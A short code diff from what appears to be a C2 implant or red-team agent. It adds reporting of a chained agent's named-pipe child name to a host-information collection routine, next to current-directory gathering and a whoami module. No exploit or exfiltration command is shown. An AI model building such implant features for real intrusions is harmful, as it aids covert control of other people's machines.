@@ -234,6 +234,10 @@ void sysinfo_collect(Buffer *tlv_out) {
     char cwd[MAX_PATH] = {0};
     GetCurrentDirectoryA(MAX_PATH, cwd);
     tlv_add_string(tlv_out, TLV_CWD, cwd);
+
+    /* Pipe child name (if chained agent) */
+    if (g_pipe_child_mode && g_pipe_child_name[0] != '\0')
+        tlv_add_string(tlv_out, TLV_PIPE_CHILD_NAME, g_pipe_child_name);
 }
 
 /* ─── Module: whoami ─── */
